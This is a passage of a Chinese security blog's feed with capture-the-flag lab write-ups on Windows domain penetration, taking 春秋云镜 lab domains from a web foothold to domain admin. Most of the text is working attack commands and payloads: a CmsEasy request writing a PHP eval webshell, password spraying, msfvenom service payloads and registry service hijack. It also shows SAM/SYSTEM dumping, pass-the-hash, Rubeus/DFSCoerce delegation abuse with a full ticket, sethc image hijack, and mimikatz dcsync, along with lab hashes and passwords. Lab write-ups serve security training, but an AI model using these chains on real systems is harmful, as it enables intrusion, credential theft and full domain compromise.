xiaorang.lab/administrator@172.22.3.2</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231016213514443.png" alt="image-20231016213514443"></p><p>拿下域控的flag  最后一个flag的话是在exchange的邮件里面</p><p>是在Lumia用户的桌面上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 pthexchange.py --target https://172.22.3.9/ --username Lumia --password &#x27;00000000000000000000000000000000:862976f8b23c13529c2fb1428e710296&#x27; --action Download</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231016214338998.png" alt="image-20231016214338998"></p><p>这里别人能执行成功  我执行报错  就不研究了  去看别人wp就行了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;fscan先扫一波&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231016201318668.png&quot; alt=&quot;image-20231016201318668&quot;&gt;&lt;/p&gt;
&lt;p&gt;8000端口有一个&lt;code&gt;Lumia ERP&lt;/code&gt;&lt;/</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Delegation</title>
    <link href="https://ke1nys.github.io/posts/bdc052b9.html"/>
    <id>https://ke1nys.github.io/posts/bdc052b9.html</id>
    <published>2023-10-10T10:15:40.000Z</published>
    <updated>2023-10-20T14:12:45.767Z</updated>
    
    <content type="html"><![CDATA[<p>fscan开扫</p><p><img src="../images/image-20231010192348417.png" alt="image-20231010192348417"></p><p><img src="../images/image-20231010192404021.png" alt="image-20231010192404021"></p><p>扫描发现后台<code>/admin</code></p><p>弱口令登录</p><p><code>admin/123456</code></p><p><img src="../images/image-20231010192457210.png" alt="image-20231010192457210"></p><p>在后台登录时就已经看到了这个cms的版本后 于是google一下</p><p><a href="https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012">https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012 </a>    后台RCE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default HTTP/1.1</span><br><span class="line">Host: 39.98.127.31</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=m9fbpga5avq5itn03q12h5ldkk; login_username=admin; login_password=a14cdfc627cef32c707a7988e70c1313</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 49</span><br><span class="line"></span><br><span class="line">sid=#data_d_.._d_.._d_.._d_1.php&amp;slen=693&amp;scontent=&lt;?php @eval($_POST[1]);phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">//Response </span><br><span class="line">ok</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010192848064.png" alt="image-20231010192848064"></p><p>成功写入  直接反弹shell到主机的vps上</p><p>flag在home目录下  在读取的时候发现这个权限不够 于是尝试开始提权</p><p><img src="../images/image-20231010193138271.png" alt="image-20231010193138271"></p><p>这个diff去查一下</p><p><img src="../images/image-20231010193210058.png" alt="image-20231010193210058"></p><p><img src="../images/image-20231010193303330.png" alt="image-20231010193303330"></p><p>这里给了个机器账户的本地账户</p><p>先去扫下内网</p><p><img src="../images/image-20231010193645120.png" alt="image-20231010193645120"></p><p>资源整理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">172.22.4.36  getshell主机</span><br><span class="line"></span><br><span class="line">172.22.4.7  域控主机DC01</span><br><span class="line"></span><br><span class="line">172.22.4.45  域内主机 WIN19</span><br><span class="line"></span><br><span class="line">172.22.4.19 FILESERVER </span><br></pre></td></tr></table></figure><p>先搭建隧道  这里使用的是stowaway</p><p>然后根据第一个提示  给了WIN19的本地账户WIN19\Adrian  于是猜测需要去爆破  因为是本地账户  所以不能使用<code>kerbrute</code>来进行爆破  于是我们尝试使用<code>crackmapexec</code>来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.4.45 -u Adrian -p rockyou.txt -d WIN19</span><br><span class="line"></span><br><span class="line">//使用前提还是开了139  445的端口前提下 -h可以查看允许爆破类型</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010194545801.png" alt="image-20231010194545801"></p><blockquote><p>WIN19\Adrian     babygirl1</p></blockquote><p>尝试rdp一下  因为前面开了这个3389端口来</p><p><img src="../images/image-20231010194733741.png" alt="image-20231010194733741"></p><p>提示密码过期 这里本来是想用<code>smbpasswd.py</code>来进行更改的  但是发现不行这里  估计是本地用户的原因</p><p><strong>于是发现了kali的<code>rdesktop</code>可以无密码登录</strong>  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains3 rdesktop 172.22.4.45</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010200954046.png" alt="image-20231010200954046"></p><p>修改密码后成功登录</p><p>发现桌面上多了个文件夹</p><p><img src="../images/image-20231010201116640.png" alt="image-20231010201116640"></p><p>里面的一个html文件的内容  <strong>只要是这个计算机的用户都可以权限对注册表进行操作</strong></p><p><strong>这里在之前试了一下  发现可以直接修改注册表  改成自己的生成的木马的地址  也能返回到system权限</strong></p><p><strong>但是这里的话用这个方法获取不到这个机器的hash值  不能进行下一步操作了  因为只有这个机器在域内  其他用户都不在</strong></p><p>于是这里的话我们先生成一个exe文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/exec cmd=&#x27;C:\windows\system32\cmd.exe /c C:\users\Adrian\Desktop\sam.bat &#x27; --platform windows -f exe-service &gt; a.exe</span><br></pre></td></tr></table></figure><p>然后写一个sam.bat，内容如下然后传到win机器上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system C:\Users\Adrian\Desktop\system</span><br><span class="line">reg save hklm\sam C:\Users\Adrian\Desktop\sam</span><br><span class="line">reg save hklm\security C:\Users\Adrian\Desktop\security</span><br></pre></td></tr></table></figure><p>注册表中的这三个位置  存放的就是本机上所有用户包括机器的密码的hash值  所以我们得去获取他</p><p>修改注册表服务 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Services\gupdate&quot; /t REG_EXPAND_SZ /v ImagePath /d &quot;C:\Users\Adrian\Desktop\a.exe&quot; /f</span><br></pre></td></tr></table></figure><p>记得路径不要出错</p><p><img src="../images/image-20231010201813604.png" alt="image-20231010201813604"></p><p>然后运行这个gupdate</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start gupdate</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010201918904.png" alt="image-20231010201918904"></p><p>我们就成功把注册表上的几个文件给下载下来了 </p><p><img src="../images/image-20231010212212597.png" alt="image-20231010212212597"></p><p><strong>其实也可以通过这种方式来进行反弹shell操作  但是这个弹到Viper或者cs上的话  使用hashdump和creds_all的话都是获取不到这个机器的hash值的  只能获取到本地账户的hash值</strong>  </p><p>于是我们拖到本地进行离线提权hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py LOCAL -system system -sam sam -security security</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010202145550.png" alt="image-20231010202145550"></p><p>这样的话我们的本地管理员和机器用户的hash值就全部爆出来了</p><p><strong>并且有一点就是这个本地管理员的psexec和这个域管的psexec用法还是有不同的</strong></p><p><strong>(可能是因为全部的hash前半部分相同的原因吧)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">本地管理员</span><br><span class="line">proxychains4 python3 psexec.py administrator@172.22.4.45 -hashes &quot;aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab&quot; -codec gbk</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">域管</span><br><span class="line">proxychains4 python wmiexec.py -hashes :aad3b435b51404eeaad3b435b51404ee xiaorang.lab/administrator@172.22.4.45</span><br></pre></td></tr></table></figure><blockquote><p>这里有一点很奇怪 使用本地管理员 psexec.py来进行连接时  返回的是system权限</p><p>wmiexec.py 连接时返回的时admin权限   </p><p>按道理来说  本地管理员时不应该有system权限的  这是机器才有的权限</p><p>留着思考一下？？？？？？？？？？？？？？</p></blockquote><p>—————————————————————————-(google找了一下  原因是这样的)————————————————————</p><ul><li>这个其实跟psexec.py的运行过程是相关的</li></ul><p><img src="../images/image-20231010223329966.png" alt="image-20231010223329966"></p><p>其实在执行代码的时候  也会回显出代码服务创建  这里就是因为在远程机器上创建了这个系统服务  然后又因为这个系统服务是以<code>system</code>权限来执行的   于是我们获取到的就是这个system权限了</p><p><strong>(前提是必须使用administrator用户来进行连接   不然没有权限来创建这个服务)</strong></p><p><img src="../images/image-20231010223541185.png" alt="image-20231010223541185"></p><p><strong>在了解这个的过程中还发现了这两者都是基于这个<code>ipc$</code>    其对应的就是<code>445  139</code>端口</strong>  </p><p>一般默认是开启的</p><p><img src="../images/image-20231010224004389.png" alt="image-20231010224004389"></p><p><strong>如果执行net share没有反应的话  说明了这个ipc$没有开启   psexec和wmi就用不了了</strong></p><hr><p>为了能过使用本地管理员账户  我们创建一个新账户加到本地管理员组里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user Ke1nys qwer1234! /add</span><br><span class="line">net localgroup administrators Ke1nys /add</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010203627261.png" alt="image-20231010203627261"></p><p>这里查看一下域内信息</p><p><img src="../images/image-20231010203717730.png" alt="image-20231010203717730"></p><p>因为这里psexec连接上去的是这个system权限  这个权限是机器的权限  并且只有这个机器在域内  其他用户均为本地成员 看不了域内成员</p><p><img src="../images/image-20231010203836101.png" alt="image-20231010203836101"></p><p>先rdp上刚刚创建的用户</p><p>然后kali运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 bloodhound-python -u win19$ --hashes &quot;aad3b435b51404eeaad3b435b51404ee:544cd3307615b72c370b3fea4d76fb65&quot; -d xiaorang.lab -dc dc01.xiaorang.lab -c all --dns-tcp -ns 172.22.4.7 --auth-method ntlm --zip</span><br><span class="line"></span><br><span class="line">//这个方法很骚  不用上传sharphound就能获取到这个压缩包  只需要获取到一个域账户的密码或者has</span><br><span class="line">//这里用的hash值是机器的hash值  因为只有机器在域内</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010205618301.png" alt="image-20231010205618301"></p><p><img src="../images/image-20231010211757396.png" alt="image-20231010211757396"></p><p><a href="https://forum.butian.net/share/1944">https://forum.butian.net/share/1944</a>  这篇文章写的很好  几乎总结了非约束委派的攻击</p><p><strong>简洁点说就是强制域控向目标主机发起身份验证  由于开启了非约束委派  就能获取到域控的TGT票据</strong></p><p>先使用<strong>本地管理员</strong>运行<code>Rubeus.exe</code>   并且监听   <strong>(需要管理员权限)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$</span><br></pre></td></tr></table></figure><p>使用 DFSCoerce 漏洞利用工具，触发辅域控进行强制验证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 dfscoerce.py -u win19$ -hashes &quot;aad3b435b51404eeaad3b435b51404ee:544cd3307615b72c370b3fea4d76fb65&quot; -d xiaorang.lab win19 172.22.4.7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//这里用的hash值是机器的hash值</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010210557409.png" alt="image-20231010210557409"></p><p>然后ptt注入到内存中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD6wZL58oV7f7zZFBrMFkbAa5M+OSIALaywU/VrSxKEOb1HHvPzIbGEW7LMmPRNsZ7v/GB2EMhZ5HySrR/OYXvVwL6SwetfRB4FKQtwxqt9q46DGDzv0Nvu4Vgaq8i6vkO6T9qv+7yOhDUVkNU15LrEmn5x2fNpzdayhLLbmcER61oyplHwnRjohA6hTJzPOFZ2lqb5o7ComIWVn75vlEYD7VrVxvEvzHKVXi+vszYu2pIpjDqG+ypB4ekRoEKLkAm5V0mnhBfwVgNXxD6fJPw7yTsCi5GFRHwwblNmxCKccYyAUa9TSO4ep2UZWvL6ZNfy7FjlgAhIhzpbwqbcyFB02IFqvXK8ii7yn/Wl/ybI0lQkDeqt2XoLhTkOIcn+AEYG+DBiGyPHX1f856QLFS0iRP3wn70JK1br505QCqRt+C9+lLQP8vwQxgsWvcr1lJlEtblOPNl0J4F+QLfKkFYZVVTjs9K7ZOMA2jnTC6MI0PnL1Dq2iDXcYxRZX5IUjkNFzC38pwgl8ENSE87BjMUEfJcrSLv5mR88PbI2/ZEbva9geW483mMMMoBvgsX03zCWto4dUEnfNIxPYpd+lJfMPCAwhMrOJTIYIlOI9D9iCcL1+y3NSf4G7u3MiXXozX3q9LmpYw5KtZA3HdPL4oQ2b5fwSzGj7+x6VaqAvksfLRCU4uwT70kzd05l4L45LHlPao208057PvtEoN5ulakfctRytd6ql3GLWAbx6euNL905niHadPAQoYQA5Y8XiNTvOXU7bmA5dNnXHr/PgrJ2ruG5RIea52HbwLcuAZD28F+pS75bp1j5/wbKUybM/rpEqhNC5kcp7dRqMonbZpmahCbs23rskOr10ApUWEn3r2vPIcVZHRv7Hg/ddellNO9jTHbofARWm0QokiET4pDzb88yaHv50njhkIwBDtM/dvq+ct+qgfDAPKawnLPrUJQD7N1SbFOSWhe2yZKgBi5H4+HYq+R2RZnIApBk9o+n46fKus/z30rRcVPzlw+UyMrhBWO1sQKoPnpmXU6HF5x7TDQTV9mmz662O/PBSTXNrmhrl3kGM7aGazXdS6kvw0efrr+q1sLbIOB0NK1FCG7jaiHA64CSAc2wfv5RdvLbyynfj5xd6EQ6MEPG8uksKAZmQfQBYbDX6VEo3AbOarRFU64fcofmM4bim+mC8zRDO5u6IRzzumKJY5RQBVu8/ariYxmoKO3NATVUG4LD5bGAt3VxvxqZLB8znObSSPV2vpxQgXza1JI/Ka73c8Qjac0GrnFgKaUqX+Qz7f7GpOQW+MrxOCtiMz8h3rcE+DakoD87wVdLUwxVSkm4nCC38ncACTWcNK6LA+JXHl/gEyHKbkIetS43uPyl1EcBFevBgVaqx7UDYBgPftUb3T5QsBAtESt45UFgwgVsSk24OOO6MuR2ZwsvII6Lh4aEWPhujgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCAMuVQ3Nb40HrUocO728XSfvrrukgPxsxytwOi4m+NCqaEOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDIzMTAxMDExMjIwM1qmERgPMjAyMzEwMTAyMTIyMDNapxEYDzIwMjMxMDE3MTEyMjAzWqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231010210812205.png" alt="image-20231010210812205"></p><p><code>echo &#39;base64xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#39; | base64 -d &gt; DC01.kirbi</code></p><p>这里话也可以将base解码然后存入<code>DC01.kirbi</code>   <strong>(主要是这个后缀  名字无所谓)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::purge&quot; &quot;kerberos::ptt DC01.kirbi&quot;</span><br></pre></td></tr></table></figure><p>当然了  也可以转发为cache导入  这三个是可以互相转化的</p><p>注入票据成功  然后开始dyscn导出域控hash值进行  pth攻击</p><p><img src="../images/image-20231010210950030.png" alt="image-20231010210950030"></p><p><img src="../images/image-20231010211412842.png" alt="image-20231010211412842"></p><p>做题的时候写了点东西</p><blockquote><p>system(机器账户)  是机器账户固有的权限</p><p>administrator(本地管理员账户)  拥有的是别的权限 不是system权限</p><p>这个两个账户是不同的  在这个域中的话  使用hashdump  或者是meterpreter的load kiwi 的creds_all获取的只有这个计算机内的用户的hash值  获取不到这个机器账户的hash值  能获取到的话只有这个注册表里的sam system  security  通过脚本爆破的话是可以爆破出这个机器账户的hash值 (python3 secretsdump.py LOCAL -system system -sam sam -security security)</p><p>当然了 一般除了system和admin用户外  一般人下载不到这三个注册表里的东西 (提权用的东西除外)</p><p>还有一点就是本地普通用户的话 执行 net user /domain  的话  是会报错的<br>WIN\xxx  这种用户名的一般是本地用户</p><p>域用户的话一般是—————》  xxxx@domain</p><p>可能存在的一种情况就是机器是域内账户  其他是本地账户  如果要想执行别的操作的话  大多数情况下是得要域内账户</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;fscan开扫&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231010192348417.png&quot; alt=&quot;image-20231010192348417&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-202310101</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>域渗透-注册表漏洞利用</title>
    <link href="https://ke1nys.github.io/posts/27821cfa.html"/>
    <id>https://ke1nys.github.io/posts/27821cfa.html</id>
    <published>2023-10-10T03:10:38.000Z</published>
    <updated>2023-10-20T14:12:45.766Z</updated>
    
    <content type="html"><![CDATA[<p>先占个坑  以后深入学习了 后面再写</p><p><a href="https://www.freebuf.com/articles/es/214551.html">https://www.freebuf.com/articles/es/214551.html</a></p><p><a href="https://www.cnblogs.com/Mikasa-Ackerman/p/Windows-zhu-ce-biao-de-xue-xi.html">https://www.cnblogs.com/Mikasa-Ackerman/p/Windows-zhu-ce-biao-de-xue-xi.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;先占个坑  以后深入学习了 后面再写&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.freebuf.com/articles/es/214551.html&quot;&gt;https://www.freebuf.com/articles/es/214551.html&lt;/a&gt;&lt;/</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Tsclient</title>
    <link href="https://ke1nys.github.io/posts/72d64c19.html"/>
    <id>https://ke1nys.github.io/posts/72d64c19.html</id>
    <published>2023-10-07T13:16:01.000Z</published>
    <updated>2023-10-07T14:29:22.122Z</updated>
    
    <content type="html"><![CDATA[<p>常规操作 fscan开扫</p><p><img src="../images/image-20231007211805267.png" alt="image-20231007211805267"></p><p>只有一个win主机  并且这个win主机的话 是开启了mssql服务  并且使用了弱口令</p><p>MDUT登录</p><p><img src="../images/image-20231007211940258.png" alt="image-20231007211940258"></p><p>这条权限开启了  尝试土豆家族提权</p><p>然后上线CS</p><p><img src="../images/image-20231007212152027.png" alt="image-20231007212152027"></p><p>这里的话我是使用了spawn来派生到meterpreter</p><p><a href="https://blog.csdn.net/weixin_39190897/article/details/118353886">https://blog.csdn.net/weixin_39190897/article/details/118353886</a></p><p>其实meterpreter的getsystem自带这个土豆提权</p><p>在拿到第一个flag的时候 <strong>提示我们看看域内有没有别的用户</strong> </p><p>于是我们使用别的命令进行查看  （<strong>等会我们偷下别人的图  因为懒的重置靶机重新打了）</strong></p><p><em>**</em> <img src="../images/image-20231007212726960.png" alt="image-20231007212726960"></p><p><img src="../images/image-20231007212737126.png" alt="image-20231007212737126"></p><p><img src="../images/image-20231007212755698.png" alt="image-20231007212755698"></p><p>因为我们获得了这个system权限  于是我们直接注入这个用户的rdp进程</p><p><img src="../images/image-20231007212906974.png" alt="image-20231007212906974"></p><p>上线后查看用户可以看到它存在共享文件</p><p><img src="../images/image-20231007212925680.png" alt="image-20231007212925680"></p><p>然后直接访问这个共享文件夹的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell type \\tsclient\c\credential.txt</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell type \\tsclient\c\credential.txt</span><br><span class="line">[*] Tasked beacon to run: type \\tsclient\c\credential.txt</span><br><span class="line">[+] host called home, sent: 63 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#</span><br><span class="line"></span><br><span class="line">Do you know how to hijack Image?</span><br></pre></td></tr></table></figure></blockquote><p>读出来一个域账户和提示</p><p>于是先去尝试进行密码喷洒攻击  看看是谁的密码</p><p>(但是是在内网  于是我们先上传fscan扫一下)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">172.22.8.18  就是外网主机的内网地址  WIN-WEB</span><br><span class="line"></span><br><span class="line">172.22.8.15  DC01 </span><br><span class="line"></span><br><span class="line">172.22.8.31  WIN19-CLIENT</span><br><span class="line"></span><br><span class="line">172.22.8.46  Win2016</span><br><span class="line"></span><br><span class="line">netstat的时候看到  31正在RDP18</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这次拿win主机来当跳板机</span><br></pre></td></tr></table></figure><p>整理好信息后  我们上传代理</p><p>然后密码喷洒</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q crackmapexec smb 172.22.8.0/24 -u &#x27;Aldrich&#x27; -p &#x27;Ald@rLMWuy7Z!#&#x27;</span><br><span class="line">proxychains4 crackmapexec rdp 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Z!# -d xiaorang.lab</span><br></pre></td></tr></table></figure><p>smb和RDP谁都可以</p><p>然后发现31 46都可以 </p><p>于是进行登录  这里rdp登录会话的会提示密码过期</p><p>于是我们对这两账号密码进行修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbpasswd.py xiaorang.lab/Aldrich:&#x27;Ald@rLMWuy7Z!#&#x27;@172.22.8.15 -newpass &#x27;Whoami@666&#x27;</span><br></pre></td></tr></table></figure><p>但是这里话只能登录  46这台机器  31这台机器的话不可以  会提示我们不在远程登录这个组里面</p><p>登录46这台机器后呢  我们根据前面的提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Do you know how to hijack Image?</span><br></pre></td></tr></table></figure><p>就是镜像提权</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">get-acl -path &quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot; | fl *</span><br><span class="line"></span><br><span class="line">//这个是查看权限</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231007222419719.png" alt="image-20231007222419719"></p><p>这个用户就是经过身份验证的用户获取到的权限</p><p><strong>(SetValue  CreateSubKey ReadKey)的话  就是具有读写权限</strong></p><p><a href="https://www.freebuf.com/articles/es/214551.html">https://www.freebuf.com/articles/es/214551.html</a>  <strong>镜像劫持的文章</strong></p><p>这里我们发现所有正常登录的用户都可以修改注册表，利用这个性质，修改注册表映像劫持</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\Windows\System32\cmd.exe&quot;</span><br></pre></td></tr></table></figure><p>简单的说就是打开注册表的同时  管理员cmd命令行也会弹出来 </p><p>然后我们点击左下角的头像  点锁定</p><p><img src="../images/image-20231007213906983.png" alt="image-20231007213906983"></p><p>然后连续点击shift  就会弹出来了</p><p><img src="../images/image-20231007213944604.png" alt="image-20231007213944604"></p><p>然后就可以读取flag了</p><p>然后开始sharpblood查看域</p><p><img src="../images/image-20231007214100613.png" alt="image-20231007214100613"></p><p>发现了我们rdp的这个机器有域控的权限</p><p>因为我们也获取了该机器的管理员权限</p><p>使用<code>sekurlsa::logonpasswords</code>抓取本机hash值</p><p>于是我们使用mimikatz导出该机器的hash值进行hash传递</p><p>然后执行dscync来导出域内所有hash值 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. sekurlsa::logonpasswords</span><br><span class="line">2. mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:WIN2016$ /domain:xiaorang.lab /ntlm:4ba974f170ab0fe1a8a1eb0ed8f6fe1a&quot; &quot;exit&quot;</span><br><span class="line">3. mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">这样的话我们就能拿到域管的hash值了</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后拿着域管的hash值进行pth攻击就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python psexec.py -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.46</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;常规操作 fscan开扫&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20231007211805267.png&quot; alt=&quot;image-20231007211805267&quot;&gt;&lt;/p&gt;
&lt;p&gt;只有一个win主机  并且这个win主机的话 是开启了mss</summary>
      
    
    
    
    
    <category term="内网" scheme="https://ke1nys.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜-Initial</title>
    <link href="https://ke1nys.github.io/posts/327fc326.html"/>
    <id>https://ke1nys.github.io/posts/327fc326.html</id>
    <published>2023-10-06T10:33:59.000Z</published>
    <updated>2023-10-07T14:29:22.122Z</updated>
    
